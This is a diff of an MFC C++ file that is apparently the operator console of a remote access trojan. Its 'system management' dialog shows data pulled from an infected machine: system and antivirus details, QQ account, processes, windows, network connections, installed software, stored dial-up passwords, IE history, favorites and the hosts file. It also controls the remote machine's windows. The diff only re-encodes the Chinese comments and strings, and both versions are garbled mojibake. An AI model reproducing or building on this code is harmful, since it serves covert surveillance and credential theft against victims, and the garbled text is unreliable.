@@ -1,4 +1,4 @@
-ï»¿
+
 // SystemDlg.cpp : implementation file
 //
 
@@ -22,9 +22,9 @@ typedef SIZE_T
 
 enum
 {
-	COMMAND_MEMOEY=1,     //è·å–CPUå†…å­˜å€¼å‘½ä»¤
-	COMMAND_STOPED,       //å‘é€åœæ­¢å‘½ä»¤
-	TOKEN_MEMORY          //æœåŠ¡ç«¯å‘é€è¿‡æ¥å†…å­˜ä½¿ç”¨å€¼
+	COMMAND_MEMOEY=1,     //»ñÈ¡CPUÄÚ´æÖµÃüÁî
+	COMMAND_STOPED,       //·¢ËÍÍ£Ö¹ÃüÁî
+	TOKEN_MEMORY          //·şÎñ¶Ë·¢ËÍ¹ıÀ´ÄÚ´æÊ¹ÓÃÖµ
 };
 
 DWORD Mempszhi = 0;
@@ -32,7 +32,7 @@ DWORD Mempszhi = 0;
 /////////////////////////////////////////////////////////////////////////////
 // CSystemDlg dialog
 
-extern int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes);    //å¤„ç†å›¾æ ‡
+extern int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes);    //´¦ÀíÍ¼±ê
 CSystemDlg::CSystemDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
 	: CDialog(CSystemDlg::IDD, pParent)
 {
@@ -57,7 +57,7 @@ CSystemDlg::CSystemDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *p
 // 	m_hIcon = sfi.hIcon;
 // 	
 // 	HIMAGELIST hImageList;
-// 	// åŠ è½½ç³»ç»Ÿå›¾æ ‡åˆ—è¡¨
+// 	// ¼ÓÔØÏµÍ³Í¼±êÁĞ±í
 // 	hImageList = (HIMAGELIST)SHGetFileInfo
 // 		(
 // 		NULL,
@@ -107,7 +107,7 @@ void CSystemDlg::OnReceiveComplete()
 	case TOKEN_DIALUPASS:
 		ShowDialupassList();
 		break;
-	case TOKEN_MEMORY:             //CPUå†…å­˜æ•°æ®åˆ°æ¥
+	case TOKEN_MEMORY:             //CPUÄÚ´æÊı¾İµ½À´
 		OnReceiveCpuMemory();
 		break;
 	case TOKEN_SOFTWARE:
@@ -125,7 +125,7 @@ void CSystemDlg::OnReceiveComplete()
 	case TOKEN_HOSTSINFO:
 		ShowHostsInfo();
 	default:
-		// ä¼ è¾“å‘ç”Ÿå¼‚å¸¸æ•°æ®
+		// ´«Êä·¢ÉúÒì³£Êı¾İ
 		break;
 	}
 }
@@ -139,12 +139,12 @@ BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
 	ON_COMMAND(IDM_REFRESHPSLIST, OnRefreshPsList)
 	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB, OnSelChangeTab)
     ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESST, OnNMRClickListProcess)
-	ON_COMMAND(ID_WINDOW_REFLUSH, OnWindowReflush)  //åˆ·æ–°
-	ON_COMMAND(ID_WINDOW_CLOST, OnWindowClose)      //å…³é—­
-	ON_COMMAND(ID_WINDOW_HIDE, OnWindowHide)        //éšè—
-	ON_COMMAND(ID_WINDOW_RETURN, OnWindowShow)      //è¿˜åŸ
-	ON_COMMAND(ID_WINDOW_MAX, OnWindowMax)          //æœ€å¤§åŒ–
-	ON_COMMAND(ID_WINDOW_MIN, OnWindowMin)          //æœ€å°åŒ–
+	ON_COMMAND(ID_WINDOW_REFLUSH, OnWindowReflush)  //Ë¢ĞÂ
+	ON_COMMAND(ID_WINDOW_CLOST, OnWindowClose)      //¹Ø±Õ
+	ON_COMMAND(ID_WINDOW_HIDE, OnWindowHide)        //Òş²Ø
+	ON_COMMAND(ID_WINDOW_RETURN, OnWindowShow)      //»¹Ô­
+	ON_COMMAND(ID_WINDOW_MAX, OnWindowMax)          //×î´ó»¯
+	ON_COMMAND(ID_WINDOW_MIN, OnWindowMin)          //×îĞ¡»¯
 	ON_NOTIFY(NM_RCLICK, IDC_INFOT, OnRclickList1)
 	ON_COMMAND(ID_MENUITEM40015, OnMenuitem40015)
 	ON_COMMAND(ID_MENUITEM40016, OnMenuitem40016)
@@ -166,7 +166,7 @@ BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
 	//}}AFX_MSG_MAP
 END_MESSAGE_MAP()
 
-//å»é™¤å­—ç¬¦ä¸²ç±»å‹å‰é¢çš„ç©ºæ ¼
+//È¥³ı×Ö·û´®ÀàĞÍÇ°ÃæµÄ¿Õ¸ñ
 /////////////////////////////////////////////////////////////////////////////
 char * DelSpace1(char *szData)
 {
@@ -191,21 +191,21 @@ void CSystemDlg::ShowSystemInfo()
 	memcpy(&m_SysInfo,lpBuffer - 1,sizeof(MESSAGEInfo));
 	
 	m_list_systeminfo.DeleteAllItems();
-	m_list_systeminfo.InsertItem(0, _T("\\\\ç³»ç»Ÿä¿¡æ¯") , 0);
-	m_list_systeminfo.InsertItem(1, _T("CPU_é€Ÿåº¦:") , 7);
-	m_list_systeminfo.InsertItem(2, _T("CPU_ä¿¡æ¯:"), 8);
-	m_list_systeminfo.InsertItem(3, _T("ç³»ç»Ÿåç§°:"), 2);
-	m_list_systeminfo.InsertItem(4, _T("ç™»é™†ç”¨æˆ·:"), 11);
-	m_list_systeminfo.InsertItem(5, _T("æ´»åŠ¨æ—¶é—´:"), 16);
-	m_list_systeminfo.InsertItem(6, _T("å±å¹•åˆ†è¾¨:"), 5);
+	m_list_systeminfo.InsertItem(0, _T("\\\\ÏµÍ³ĞÅÏ¢") , 0);
+	m_list_systeminfo.InsertItem(1, _T("CPU_ËÙ¶È:") , 7);
+	m_list_systeminfo.InsertItem(2, _T("CPU_ĞÅÏ¢:"), 8);
+	m_list_systeminfo.InsertItem(3, _T("ÏµÍ³Ãû³Æ:"), 2);
+	m_list_systeminfo.InsertItem(4, _T("µÇÂ½ÓÃ»§:"), 11);
+	m_list_systeminfo.InsertItem(5, _T("»î¶¯Ê±¼ä:"), 16);
+	m_list_systeminfo.InsertItem(6, _T("ÆÁÄ»·Ö±æ:"), 5);
 	m_list_systeminfo.InsertItem(7, _T("") , 15);
-	m_list_systeminfo.InsertItem(8, _T("\\\\æœåŠ¡ç«¯ä¿¡æ¯") , 1);
-	m_list_systeminfo.InsertItem(9, _T("ä¸Šçº¿ç±»å‹:") , 6);
-	m_list_systeminfo.InsertItem(10, _T("è¿æ¥ç«¯å£:") , 4);
-	m_list_systeminfo.InsertItem(11, _T("è¿è¡Œç±»å‹:"), 3);
-	m_list_systeminfo.InsertItem(12, _T("æœåŠ¡é€”å¾„:"), 10);
-	m_list_systeminfo.InsertItem(13, _T("æ€æ¯’è½¯ä»¶:"), 9);
-	m_list_systeminfo.InsertItem(14, _T("è…¾_è®¯ QQ:"), 17);
+	m_list_systeminfo.InsertItem(8, _T("\\\\·şÎñ¶ËĞÅÏ¢") , 1);
+	m_list_systeminfo.InsertItem(9, _T("ÉÏÏßÀàĞÍ:") , 6);
+	m_list_systeminfo.InsertItem(10, _T("Á¬½Ó¶Ë¿Ú:") , 4);
+	m_list_systeminfo.InsertItem(11, _T("ÔËĞĞÀàĞÍ:"), 3);
+	m_list_systeminfo.InsertItem(12, _T("·şÎñÍ¾¾¶:"), 10);
+	m_list_systeminfo.InsertItem(13, _T("É±¶¾Èí¼ş:"), 9);
+	m_list_systeminfo.InsertItem(14, _T("ÌÚ_Ñ¶ QQ:"), 17);
 	
 	char *add = DelSpace1(m_SysInfo.szCpuInfo);
 	m_list_systeminfo.SetItemText(1, 1, m_SysInfo.szCpuSpeend);
@@ -224,8 +224,8 @@ void CSystemDlg::ShowSystemInfo()
 	MESSAGEInfo 	*info = (MESSAGEInfo *)(m_pContext->m_DeCompressionBuffer.GetBuffer(0));
 	Mempszhi = info->Memory;
 	
-	//m_MemPross.SetRange(0,(info->MemSize/1024/1024)+1);  //å†…å­˜å¤§å°
-	m_MemPross.SetRange(0,(short)Mempszhi);  //å†…å­˜å¤§å°
+	//m_MemPross.SetRange(0,(info->MemSize/1024/1024)+1);  //ÄÚ´æ´óĞ¡
+	m_MemPross.SetRange(0,(short)Mempszhi);  //ÄÚ´æ´óĞ¡
 	m_CpuPross.SetRange(0,100);
 	m_MemPross.SetPos(0);
 	m_CpuPross.SetPos(0);
@@ -273,7 +273,7 @@ void CSystemDlg::ShowProcessList()
 		m_list_process.SetItemText(i, 4, szProcUserName);
 		m_list_process.SetItemText(i, 5, szProcMemUsed);
 		m_list_process.SetItemText(i, 6, szProcFileName);
-		// ItemData ä¸ºè¿›ç¨‹ID
+		// ItemData Îª½ø³ÌID
 		m_list_process.SetItemData(i, *lpPID);
 		
 		dwOffset += sizeof(DWORD) + 
@@ -285,7 +285,7 @@ void CSystemDlg::ShowProcessList()
 			lstrlen(szProcFileName) + 1;
 	}
 	
-	strProcessID.Format("ç¨‹åºè·¯å¾„ / %d", i);
+	strProcessID.Format("³ÌĞòÂ·¾¶ / %d", i);
 	LVCOLUMN lvc;
 	lvc.mask = LVCF_TEXT;
 	lvc.pszText = strProcessID.GetBuffer(0);
@@ -307,7 +307,7 @@ void CSystemDlg::ShowWindowsList(void)
 		for (int j=0; j<m_list_windows.GetItemCount(); j++)
 		{
 			CString temp=m_list_windows.GetItemText(j,2);
-			CString restr="éšè—";
+			CString restr="Òş²Ø";
 			if (temp!=restr)
 			{
 				m_list_windows.DeleteItem(j);
@@ -327,12 +327,12 @@ void CSystemDlg::ShowWindowsList(void)
 		str.Format("%5u", *lpPID);
 		m_list_windows.InsertItem(i, str);
 		m_list_windows.SetItemText(i, 1, lpTitle);
-		m_list_windows.SetItemText(i, 2, "æ˜¾ç¤º"); //(d) å°†çª—å£çŠ¶æ€æ˜¾ç¤ºä¸º "æ˜¾ç¤º"
-		// ItemData ä¸ºçª—å£å¥æŸ„
+		m_list_windows.SetItemText(i, 2, "ÏÔÊ¾"); //(d) ½«´°¿Ú×´Ì¬ÏÔÊ¾Îª "ÏÔÊ¾"
+		// ItemData Îª´°¿Ú¾ä±ú
 		m_list_windows.SetItemData(i, (DWORD)*phWnd);  //(d)
 		dwOffset += sizeof(DWORD) + sizeof(HWND) + lstrlen(lpTitle) + 1;
 	}
-	str.Format("çª—å£åç§° / %d", i);
+	str.Format("´°¿ÚÃû³Æ / %d", i);
 	LVCOLUMN lvc;
 	lvc.mask = LVCF_TEXT;
 	lvc.pszText = str.GetBuffer(0);
@@ -378,68 +378,68 @@ BOOL CSystemDlg::OnInitDialog()
 	memset(&sockAddr, 0, sizeof(sockAddr));
 	int nSockAddrLen = sizeof(sockAddr);
 	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
-	str.Format("\\\\%s - ç³»ç»Ÿç®¡ç†", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
+	str.Format("\\\\%s - ÏµÍ³¹ÜÀí", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
 	SetWindowText(str);
 	
-	m_tab.InsertItem(0, "ç³»ç»Ÿä¿¡æ¯");
-	m_tab.InsertItem(1, "è¿›ç¨‹ç®¡ç†");
-	m_tab.InsertItem(2, "çª—å£ç®¡ç†");
-	m_tab.InsertItem(3, "ç½‘ç»œè¿æ¥");
-	m_tab.InsertItem(4, "è½¯ä»¶ä¿¡æ¯");
-	m_tab.InsertItem(5, "æ‹¨å·å¯†ç ");
-	m_tab.InsertItem(6, "å†å²è®°å½•");
-	m_tab.InsertItem(7, "IEæ”¶è—å¤¹");
-	m_tab.InsertItem(8, "Hostæ–‡ä»¶");
+	m_tab.InsertItem(0, "ÏµÍ³ĞÅÏ¢");
+	m_tab.InsertItem(1, "½ø³Ì¹ÜÀí");
+	m_tab.InsertItem(2, "´°¿Ú¹ÜÀí");
+	m_tab.InsertItem(3, "ÍøÂçÁ¬½Ó");
+	m_tab.InsertItem(4, "Èí¼şĞÅÏ¢");
+	m_tab.InsertItem(5, "²¦ºÅÃÜÂë");
+	m_tab.InsertItem(6, "ÀúÊ·¼ÇÂ¼");
+	m_tab.InsertItem(7, "IEÊÕ²Ø¼Ğ");
+	m_tab.InsertItem(8, "HostÎÄ¼ş");
 	
 	m_list_systeminfo.SetExtendedStyle(LVS_EX_FLATSB|LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT|LVS_EX_SUBITEMIMAGES);
-	m_list_systeminfo.InsertColumn(0, "å±æ€§", LVCFMT_LEFT, 150);
-	m_list_systeminfo.InsertColumn(1, "å†…å®¹", LVCFMT_LEFT, 550);
+	m_list_systeminfo.InsertColumn(0, "ÊôĞÔ", LVCFMT_LEFT, 150);
+	m_list_systeminfo.InsertColumn(1, "ÄÚÈİ", LVCFMT_LEFT, 550);
 	
 	m_list_process.SetExtendedStyle( LVS_EX_FLATSB|LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT|LVS_EX_SUBITEMIMAGES);
-	m_list_process.InsertColumn(0, "æ˜ åƒåç§°", LVCFMT_LEFT, 121);
+	m_list_process.InsertColumn(0, "Ó³ÏñÃû³Æ", LVCFMT_LEFT, 121);
 	m_list_process.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
-	m_list_process.InsertColumn(2, "ä¼˜å…ˆçº§", LVCFMT_LEFT, 50);
-	m_list_process.InsertColumn(3, "çº¿ç¨‹æ•°", LVCFMT_LEFT, 50);
-	m_list_process.InsertColumn(4, "ç”¨æˆ·å", LVCFMT_LEFT, 90);
-	m_list_process.InsertColumn(5, "å†…å­˜ä½¿ç”¨", LVCFMT_LEFT, 70);
-	m_list_process.InsertColumn(6, "ç¨‹åºè·¯å¾„", LVCFMT_LEFT, 250);
+	m_list_process.InsertColumn(2, "ÓÅÏÈ¼¶", LVCFMT_LEFT, 50);
+	m_list_process.InsertColumn(3, "Ïß³ÌÊı", LVCFMT_LEFT, 50);
+	m_list_process.InsertColumn(4, "ÓÃ»§Ãû", LVCFMT_LEFT, 90);
+	m_list_process.InsertColumn(5, "ÄÚ´æÊ¹ÓÃ", LVCFMT_LEFT, 70);
+	m_list_process.InsertColumn(6, "³ÌĞòÂ·¾¶", LVCFMT_LEFT, 250);
 	
 	m_list_windows.SetExtendedStyle(LVS_EX_FLATSB|LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT|LVS_EX_SUBITEMIMAGES);
 	m_list_windows.InsertColumn(0, "PID", LVCFMT_LEFT, 70);
-	m_list_windows.InsertColumn(1, "çª—å£åç§°", LVCFMT_LEFT, 300);
-	m_list_windows.InsertColumn(2, "çª—å£çŠ¶æ€", LVCFMT_LEFT, 70);
+	m_list_windows.InsertColumn(1, "´°¿ÚÃû³Æ", LVCFMT_LEFT, 300);
+	m_list_windows.InsertColumn(2, "´°¿Ú×´Ì¬", LVCFMT_LEFT, 70);
 	
 	m_list_netstate.SetExtendedStyle(LVS_EX_FLATSB|LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT|LVS_EX_SUBITEMIMAGES);
-	m_list_netstate.InsertColumn(0, "è¿›ç¨‹å", LVCFMT_LEFT, 100);
+	m_list_netstate.InsertColumn(0, "½ø³ÌÃû", LVCFMT_LEFT, 100);
 	m_list_netstate.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
-	m_list_netstate.InsertColumn(2, "åè®®", LVCFMT_LEFT, 50);
-	m_list_netstate.InsertColumn(3, "æœ¬åœ°åœ°å€:ç«¯å£", LVCFMT_LEFT, 130);
-	m_list_netstate.InsertColumn(4, "è¿œç¨‹åœ°å€:ç«¯å£", LVCFMT_LEFT, 130);
-	m_list_netstate.InsertColumn(5, "ç›®æ ‡IPå½’å±åœ°", LVCFMT_LEFT, 140);
-	m_list_netstate.InsertColumn(6, "è¿æ¥çŠ¶æ€", LVCFMT_LEFT, 80);
+	m_list_netstate.InsertColumn(2, "Ğ­Òé", LVCFMT_LEFT, 50);
+	m_list_netstate.InsertColumn(3, "±¾µØµØÖ·:¶Ë¿Ú", LVCFMT_LEFT, 130);
+	m_list_netstate.InsertColumn(4, "Ô¶³ÌµØÖ·:¶Ë¿Ú", LVCFMT_LEFT, 130);
+	m_list_netstate.InsertColumn(5, "Ä¿±êIP¹éÊôµØ", LVCFMT_LEFT, 140);
+	m_list_netstate.InsertColumn(6, "Á¬½Ó×´Ì¬", LVCFMT_LEFT, 80);
 	
 	m_list_software.SetExtendedStyle(LVS_EX_FLATSB|LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT|LVS_EX_SUBITEMIMAGES);
-	m_list_software.InsertColumn(0, "è½¯ä»¶åç§°", LVCFMT_LEFT, 130);
-	m_list_software.InsertColumn(1, "å‘è¡Œå•†", LVCFMT_LEFT, 85);
-	m_list_software.InsertColumn(2, "ç‰ˆæœ¬", LVCFMT_LEFT, 75);
-	m_list_software.InsertColumn(3, "å®‰è£…æ—¶é—´", LVCFMT_LEFT, 80);
-	m_list_software.InsertColumn(4, "å¸è½½å‘½ä»¤åŠå‚æ•°", LVCFMT_LEFT, 300);
+	m_list_software.InsertColumn(0, "Èí¼şÃû³Æ", LVCFMT_LEFT, 130);
+	m_list_software.InsertColumn(1, "·¢ĞĞÉÌ", LVCFMT_LEFT, 85);
+	m_list_software.InsertColumn(2, "°æ±¾", LVCFMT_LEFT, 75);
+	m_list_software.InsertColumn(3, "°²×°Ê±¼ä", LVCFMT_LEFT, 80);
+	m_list_software.InsertColumn(4, "Ğ¶ÔØÃüÁî¼°²ÎÊı", LVCFMT_LEFT, 300);
 	
 	m_list_dialupass.SetExtendedStyle(LVS_EX_FLATSB|LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT|LVS_EX_SUBITEMIMAGES);
-	m_list_dialupass.InsertColumn(0, "åç§°", LVCFMT_LEFT, 100);
-	m_list_dialupass.InsertColumn(1, "ç”¨æˆ·", LVCFMT_LEFT, 105);
-	m_list_dialupass.InsertColumn(2, "å¯†ç ", LVCFMT_LEFT, 105);
-	m_list_dialupass.InsertColumn(3, "ç”µè¯/ä¸»æœº", LVCFMT_LEFT, 100);
-	m_list_dialupass.InsertColumn(5, "è®¾å¤‡", LVCFMT_LEFT, 270);
+	m_list_dialupass.InsertColumn(0, "Ãû³Æ", LVCFMT_LEFT, 100);
+	m_list_dialupass.InsertColumn(1, "ÓÃ»§", LVCFMT_LEFT, 105);
+	m_list_dialupass.InsertColumn(2, "ÃÜÂë", LVCFMT_LEFT, 105);
+	m_list_dialupass.InsertColumn(3, "µç»°/Ö÷»ú", LVCFMT_LEFT, 100);
+	m_list_dialupass.InsertColumn(5, "Éè±¸", LVCFMT_LEFT, 270);
 	
 	m_list_iehistory.SetExtendedStyle(LVS_EX_FLATSB|LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT|LVS_EX_SUBITEMIMAGES);
-	m_list_iehistory.InsertColumn(0, "åºå·", LVCFMT_LEFT, 70);
-	m_list_iehistory.InsertColumn(1, "è®¿é—®æ—¶é—´", LVCFMT_LEFT, 130);
-	m_list_iehistory.InsertColumn(2, "æ ‡é¢˜", LVCFMT_LEFT, 150);
-	m_list_iehistory.InsertColumn(3, "ç½‘é¡µåœ°å€", LVCFMT_LEFT, 300);
+	m_list_iehistory.InsertColumn(0, "ĞòºÅ", LVCFMT_LEFT, 70);
+	m_list_iehistory.InsertColumn(1, "·ÃÎÊÊ±¼ä", LVCFMT_LEFT, 130);
+	m_list_iehistory.InsertColumn(2, "±êÌâ", LVCFMT_LEFT, 150);
+	m_list_iehistory.InsertColumn(3, "ÍøÒ³µØÖ·", LVCFMT_LEFT, 300);
 	
 	m_list_iefavorite.SetExtendedStyle(LVS_EX_FLATSB|LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT|LVS_EX_SUBITEMIMAGES);
-	m_list_iefavorite.InsertColumn(0, "æ”¶è—åç§°", LVCFMT_LEFT, 200);
+	m_list_iefavorite.InsertColumn(0, "ÊÕ²ØÃû³Æ", LVCFMT_LEFT, 200);
 	m_list_iefavorite.InsertColumn(1, "URL", LVCFMT_LEFT, 300);
 	
 	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
@@ -510,7 +510,7 @@ BOOL CSystemDlg::OnInitDialog()
 	              // EXCEPTION: OCX Property Pages should return FALSE
 }
 
-// æœ‰æ•°æ®åˆ°æ¥åˆ·æ–°CPUåŠå†…å­˜æ˜¾ç¤º
+// ÓĞÊı¾İµ½À´Ë¢ĞÂCPU¼°ÄÚ´æÏÔÊ¾
 void CSystemDlg::OnReceiveCpuMemory(void)
 {
 	DWORD d=0;
@@ -545,7 +545,7 @@ void CSystemDlg::OnClose()
 {
 	m_bClosing = TRUE;
 // 	BYTE  bToken = COMMAND_STOPED;
-// 	m_iocpServer->Send(m_pContext, &bToken, 1);  //å‘é€CPU å†…å­˜ åœæ­¢ä¿¡å·
+// 	m_iocpServer->Send(m_pContext, &bToken, 1);  //·¢ËÍCPU ÄÚ´æ Í£Ö¹ĞÅºÅ
 // 	ShowWindow(SW_HIDE);
 // 	Sleep(1000);
 	m_pContext->m_Dialog[0] = 0;
@@ -606,15 +606,15 @@ void CSystemDlg::ShowSelectWindow(BOOL bInit)
 	switch (m_tab.GetCurSel())
 	{
 	case 0:
-		m_list_systeminfo.ShowWindow(SW_SHOW); //ç³»ç»Ÿä¿¡æ¯
-		m_list_process.ShowWindow(SW_HIDE);    //è¿›ç¨‹ç®¡ç†
-		m_list_windows.ShowWindow(SW_HIDE);    //çª—å£ç®¡ç†
-		m_list_netstate.ShowWindow(SW_HIDE);   //ç½‘ç»œè¿æ¥
-		m_list_software.ShowWindow(SW_HIDE);   //è½¯ä»¶ä¿¡æ¯
-		m_list_dialupass.ShowWindow(SW_HIDE);  //æ‹¨å·å¯†ç 
-		m_list_iehistory.ShowWindow(SW_HIDE);  //IEæµè§ˆè®°å½•
-		m_list_iefavorite.ShowWindow(SW_HIDE); //IEæ”¶è—å¤¹
-		m_edit_hosts.ShowWindow(SW_HIDE);      //Hostæ–‡ä»¶
+		m_list_systeminfo.ShowWindow(SW_SHOW); //ÏµÍ³ĞÅÏ¢
+		m_list_process.ShowWindow(SW_HIDE);    //½ø³Ì¹ÜÀí
+		m_list_windows.ShowWindow(SW_HIDE);    //´°¿Ú¹ÜÀí
+		m_list_netstate.ShowWindow(SW_HIDE);   //ÍøÂçÁ¬½Ó
+		m_list_software.ShowWindow(SW_HIDE);   //Èí¼şĞÅÏ¢
+		m_list_dialupass.ShowWindow(SW_HIDE);  //²¦ºÅÃÜÂë
+		m_list_iehistory.ShowWindow(SW_HIDE);  //IEä¯ÀÀ¼ÇÂ¼
+		m_list_iefavorite.ShowWindow(SW_HIDE); //IEÊÕ²Ø¼Ğ
+		m_edit_hosts.ShowWindow(SW_HIDE);      //HostÎÄ¼ş
 		if (bInit) break;
 		
 		OnShowWindow(1);
@@ -622,120 +622,120 @@ void CSystemDlg::ShowSelectWindow(BOOL bInit)
 			GetSystemInfo();
 		break;
 	case 1:
-		m_list_systeminfo.ShowWindow(SW_HIDE); //ç³»ç»Ÿä¿¡æ¯
-		m_list_process.ShowWindow(SW_SHOW);    //è¿›ç¨‹ç®¡ç†
-		m_list_windows.ShowWindow(SW_HIDE);    //çª—å£ç®¡ç†
-		m_list_netstate.ShowWindow(SW_HIDE);   //ç½‘ç»œè¿æ¥
-		m_list_software.ShowWindow(SW_HIDE);   //è½¯ä»¶ä¿¡æ¯
-		m_list_dialupass.ShowWindow(SW_HIDE);  //æ‹¨å·å¯†ç 
-		m_list_iehistory.ShowWindow(SW_HIDE);  //IEæµè§ˆè®°å½•
-		m_list_iefavorite.ShowWindow(SW_HIDE); //IEæ”¶è—å¤¹
-		m_edit_hosts.ShowWindow(SW_HIDE);      //Hostæ–‡ä»¶
+		m_list_systeminfo.ShowWindow(SW_HIDE); //ÏµÍ³ĞÅÏ¢
+		m_list_process.ShowWindow(SW_SHOW);    //½ø³Ì¹ÜÀí
+		m_list_windows.ShowWindow(SW_HIDE);    //´°¿Ú¹ÜÀí
+		m_list_netstate.ShowWindow(SW_HIDE);   //ÍøÂçÁ¬½Ó
+		m_list_software.ShowWindow(SW_HIDE);   //Èí¼şĞÅÏ¢
+		m_list_dialupass.ShowWindow(SW_HIDE);  //²¦ºÅÃÜÂë
+		m_list_iehistory.ShowWindow(SW_HIDE);  //IEä¯ÀÀ¼ÇÂ¼
+		m_list_iefavorite.ShowWindow(SW_HIDE); //IEÊÕ²Ø¼Ğ
+		m_edit_hosts.ShowWindow(SW_HIDE);      //HostÎÄ¼ş
 		
 		OnShowWindow(0);
 		if (m_list_process.GetItemCount() == 0)
 			GetProcessList();
 		break;
 	case 2:
-		m_list_systeminfo.ShowWindow(SW_HIDE); //ç³»ç»Ÿä¿¡æ¯
-		m_list_process.ShowWindow(SW_HIDE);    //è¿›ç¨‹ç®¡ç†
-		m_list_windows.ShowWindow(SW_SHOW);    //çª—å£ç®¡ç†
-		m_list_netstate.ShowWindow(SW_HIDE);   //ç½‘ç»œè¿æ¥
-		m_list_software.ShowWindow(SW_HIDE);   //è½¯ä»¶ä¿¡æ¯
-		m_list_dialupass.ShowWindow(SW_HIDE);  //æ‹¨å·å¯†ç 
-		m_list_iehistory.ShowWindow(SW_HIDE);  //IEæµè§ˆè®°å½•
-		m_list_iefavorite.ShowWindow(SW_HIDE); //IEæ”¶è—å¤¹
-		m_edit_hosts.ShowWindow(SW_HIDE);      //Hostæ–‡ä»¶
+		m_list_systeminfo.ShowWindow(SW_HIDE); //ÏµÍ³ĞÅÏ¢
+		m_list_process.ShowWindow(SW_HIDE);    //½ø³Ì¹ÜÀí
+		m_list_windows.ShowWindow(SW_SHOW);    //´°¿Ú¹ÜÀí
+		m_list_netstate.ShowWindow(SW_HIDE);   //ÍøÂçÁ¬½Ó
+		m_list_software.ShowWindow(SW_HIDE);   //Èí¼şĞÅÏ¢
+		m_list_dialupass.ShowWindow(SW_HIDE);  //²¦ºÅÃÜÂë
+		m_list_iehistory.ShowWindow(SW_HIDE);  //IEä¯ÀÀ¼ÇÂ¼
+		m_list_iefavorite.ShowWindow(SW_HIDE); //IEÊÕ²Ø¼Ğ
+		m_edit_hosts.ShowWindow(SW_HIDE);      //HostÎÄ¼ş
 		
 		OnShowWindow(0);
 		if (m_list_windows.GetItemCount() == 0)
 			GetWindowsList();
 		break;
 	case 3:
-		m_list_systeminfo.ShowWindow(SW_HIDE); //ç³»ç»Ÿä¿¡æ¯
-		m_list_process.ShowWindow(SW_HIDE);    //è¿›ç¨‹ç®¡ç†
-		m_list_windows.ShowWindow(SW_HIDE);    //çª—å£ç®¡ç†
-		m_list_netstate.ShowWindow(SW_SHOW);   //ç½‘ç»œè¿æ¥
-		m_list_software.ShowWindow(SW_HIDE);   //è½¯ä»¶ä¿¡æ¯
-		m_list_dialupass.ShowWindow(SW_HIDE);  //æ‹¨å·å¯†ç 
-		m_list_iehistory.ShowWindow(SW_HIDE);  //IEæµè§ˆè®°å½•
-		m_list_iefavorite.ShowWindow(SW_HIDE); //IEæ”¶è—å¤¹
-		m_edit_hosts.ShowWindow(SW_HIDE);      //Hostæ–‡ä»¶
+		m_list_systeminfo.ShowWindow(SW_HIDE); //ÏµÍ³ĞÅÏ¢
+		m_list_process.ShowWindow(SW_HIDE);    //½ø³Ì¹ÜÀí
+		m_list_windows.ShowWindow(SW_HIDE);    //´°¿Ú¹ÜÀí
+		m_list_netstate.ShowWindow(SW_SHOW);   //ÍøÂçÁ¬½Ó
+		m_list_software.ShowWindow(SW_HIDE);   //Èí¼şĞÅÏ¢
+		m_list_dialupass.ShowWindow(SW_HIDE);  //²¦ºÅÃÜÂë
+		m_list_iehistory.ShowWindow(SW_HIDE);  //IEä¯ÀÀ¼ÇÂ¼
+		m_list_iefavorite.ShowWindow(SW_HIDE); //IEÊÕ²Ø¼Ğ
+		m_edit_hosts.ShowWindow(SW_HIDE);      //HostÎÄ¼ş
 		
 		OnShowWindow(0);
 		if (m_list_netstate.GetItemCount() == 0)
 			GetNetStateList();
 		break;
 	case 4:
-		m_list_systeminfo.ShowWindow(SW_HIDE); //ç³»ç»Ÿä¿¡æ¯
-		m_list_process.ShowWindow(SW_HIDE);    //è¿›ç¨‹ç®¡ç†
-		m_list_windows.ShowWindow(SW_HIDE);    //çª—å£ç®¡ç†
-		m_list_netstate.ShowWindow(SW_HIDE);   //ç½‘ç»œè¿æ¥
-		m_list_software.ShowWindow(SW_SHOW);   //è½¯ä»¶ä¿¡æ¯
-		m_list_dialupass.ShowWindow(SW_HIDE);  //æ‹¨å·å¯†ç 
-		m_list_iehistory.ShowWindow(SW_HIDE);  //IEæµè§ˆè®°å½•
-		m_list_iefavorite.ShowWindow(SW_HIDE); //IEæ”¶è—å¤¹
-		m_edit_hosts.ShowWindow(SW_HIDE);      //Hostæ–‡ä»¶
+		m_list_systeminfo.ShowWindow(SW_HIDE); //ÏµÍ³ĞÅÏ¢
+		m_list_process.ShowWindow(SW_HIDE);    //½ø³Ì¹ÜÀí
+		m_list_windows.ShowWindow(SW_HIDE);    //´°¿Ú¹ÜÀí
+		m_list_netstate.ShowWindow(SW_HIDE);   //ÍøÂçÁ¬½Ó
+		m_list_software.ShowWindow(SW_SHOW);   //Èí¼şĞÅÏ¢
+		m_list_dialupass.ShowWindow(SW_HIDE);  //²¦ºÅÃÜÂë
+		m_list_iehistory.ShowWindow(SW_HIDE);  //IEä¯ÀÀ¼ÇÂ¼
+		m_list_iefavorite.ShowWindow(SW_HIDE); //IEÊÕ²Ø¼Ğ
+		m_edit_hosts.ShowWindow(SW_HIDE);      //HostÎÄ¼ş
 		
 		OnShowWindow(0);
 		if (m_list_software.GetItemCount() == 0)
 			GetSoftWareList();
 		break;
 	case 5:
